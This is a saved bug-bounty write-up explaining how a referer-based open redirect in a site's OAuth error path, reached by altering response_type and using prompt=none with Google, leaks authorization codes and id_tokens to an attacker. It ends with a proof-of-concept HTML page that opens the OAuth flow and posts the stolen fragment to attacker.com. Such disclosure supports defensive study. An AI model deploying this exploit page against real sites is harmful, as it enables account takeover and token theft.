---
title: "OAuth Non-Happy Path to ATO"
source: "https://blog.voorivex.team/oauth-non-happy-path-to-ato?__readwiseLocation="
author:
  - "Omid Rezaei"
published: 2024-11-22
created: 2025-08-13
description: "Learn how small errors in OAuth implementation can lead to significant security vulnerabilities like one-click account takeover in web applications"
tags: ["clippings/articles", "_inbox"]
---
# OAuth Non-Happy Path to ATO

![](https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1726592696759%2Fd893c745-fc97-4add-9279-0efa665d38a2.jpeg%3Fw%3D1200%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng)

> [!summary]
> The article details an OAuth non-happy path vulnerability that enables account takeover (ATO) due to implementation errors. It exploits a referer-based open redirect by forcing the target application into an unusual flow, achieved by manipulating the `response_type` parameter to cause sensitive tokens to be appended to the URL fragment. Referer research confirmed an attacker-controlled referer could be maintained across redirects using `window.open` and 3xx status codes. While Facebook and GitHub were not exploitable, Google's flow was vulnerable as it allowed `response_type=code,id_token` and `prompt=none` to bypass user interaction, ensuring the attacker's site remained the referer. This allowed the attacker to steal both `id_token` and the critical `authorization code` from the URL fragment, leading to ATO. The reported vulnerability resulted in a $3000 bounty.

**Happy Path** definition according **to** [**Wikipedia**](https://en.wikipedia.org/wiki/Happy_path)**:**

> In the context of software or information modeling, a happy path (sometimes called happy flow) is a default scenario featuring no exceptional or error conditions. For example, the happy path for a function validating credit card numbers would be where none of the validation rules raise an error, thus letting execution continue successfully to the end, generating a positive response.

**Non-Happy Paths** definition based on Frans Rosen's write-up:

> First, let’s explain the various ways to break the OAuth-dance. When I mean break, I mean causing a difference between the OAuth-provider issuing valid codes or tokens, but the website that gets the tokens from the provider is not successfully receiving and handling the tokens. I’ll refer to this below as a “non-happy path.

## [Permalink](https://blog.voorivex.team/?__readwiseLocation=#heading-oauth-flow-of-the-target "Permalink")**OAuth Flow of the Target**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1728073019425/15bb6644-8d22-4e1b-aa30-349ce7fe5f1c.png?auto=compress,format&format=webp)

green path is the happy path

red one is an non-happy path where the application continues with a different flow.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724220247685/68598c51-c0d5-4c3c-8d7b-e69fb724d14e.png?auto=compress,format&format=webp)

## [Permalink](https://blog.voorivex.team/?__readwiseLocation=#heading-open-redirect-referer-based "Permalink")**Open Redirect Referer Based**

As observed, in the other flow, the web application (not the OAuth provider) redirects the user to the `referer` value without any parameter. This behavior is not a vulnerability, but it is not a common way for error handling. As a hunter, when I face these situations, I dig a little bit to discover something new.

## [Permalink](https://blog.voorivex.team/?__readwiseLocation=#heading-fragment-redirect "Permalink")Fragment Redirect

There are two common ways to redirect users: server-side and client-side. In the first method, when a user is redirected to another website, the fragment part of the URL remains unchanged, however, in a client-side redirect, the fragment part of the URL is removed with each redirect:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731315330876/4eb0b89d-52fe-4aea-908c-3248c31b344d.png?auto=compress,format&format=webp)

## [Permalink](https://blog.voorivex.team/?__readwiseLocation=#heading-response-type "Permalink")**Response Type**

To achieve the non-happy path (the red one in the diagram), I needed to force the application to derail from its normal behavior. So, I tried changing the `response_type` parameter from `code` to `id_token` (I learned the technique from [here](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/)), and I was able to enter the other flow.

## [Permalink](https://blog.voorivex.team/?__readwiseLocation=#heading-referer-research "Permalink")**Referer Research**

If I open `attacker.com` and it contains `window.open(‘google.com‘)` and it redirects me to the `x.com` by `3xx` status code, the [x.com](http://x.com/) will see the referer as `attacker.com`.

## [Permalink](https://blog.voorivex.team/?__readwiseLocation=#heading-exploitation-flow "Permalink")**Exploitation: Flow**

so the exploit flow looks like this,

1. the attacker sends a malicious link to the victim.
2. the victim opens the malicious link and an opener starts the Google OAuth flow with `response_type=id_token,code&prompt=none` as additional parameters.
3. In the opener, after the provider authorizes the victim, it sends them back to the value of the `redirect_uri` parameter, which is a target website.
4. Due to the non-happy path, the victim is redirected to the attacker's website with everything the attacker needs in the fragment section.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731316422739/22f91017-78f6-4a99-89f6-9404c39598ed.png?auto=compress,format&format=webp)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Website</title>
</head>
<body>
    <input type="button" value="exploit" onclick="exploit()">
    <script>
        function exploit() {
            window.open("https://accounts.google.com/o/oauth2/auth?client_id=&redirect_uri=https://target.com/api/v1/oauth/google/callback/login&scope=https://www.googleapis.com/auth/userinfo.profile%20https://www.googleapis.com/auth/userinfo.email&state=&response_type=id_token,code&prompt=none", "", "width=10, height=10");
        }

        window.addEventListener('load', () => {
            const fragment = window.location.hash;
            if (fragment) {
                const encodedFragment = encodeURIComponent(fragment);
                fetch('https://attacker.com/save_tokens', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: \`${encodedFragment}\`,
                });
            }
        });
    </script>
</body>
</html>
```